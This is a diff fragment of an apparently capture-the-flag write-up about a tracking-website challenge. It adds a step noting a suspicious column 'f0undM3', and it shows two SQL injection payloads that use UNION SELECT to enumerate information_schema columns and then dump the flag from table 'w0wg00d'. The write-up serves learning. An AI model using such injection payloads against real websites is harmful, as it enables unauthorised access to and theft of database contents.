@@ -38,8 +38,8 @@ The system displayed the tracking website that has the illegal package's trackin
 ```
 -1' UNION SELECT null,null,null,null,null,COLUMN_NAME FROM information_schema.columns-- 
 ```
-
-11. From both information we get, we can retrieve all data from other table by entering command below and found the flag
+11. It will list out all columns that available and column f0undM3 that look suspicious.
+12. From both information we get, we can retrieve all data from other table by entering command below and found the flag
 
 ```
 -1' UNION SELECT null,null,null,null,null,f0undM3 FROM w0wg00d-- 
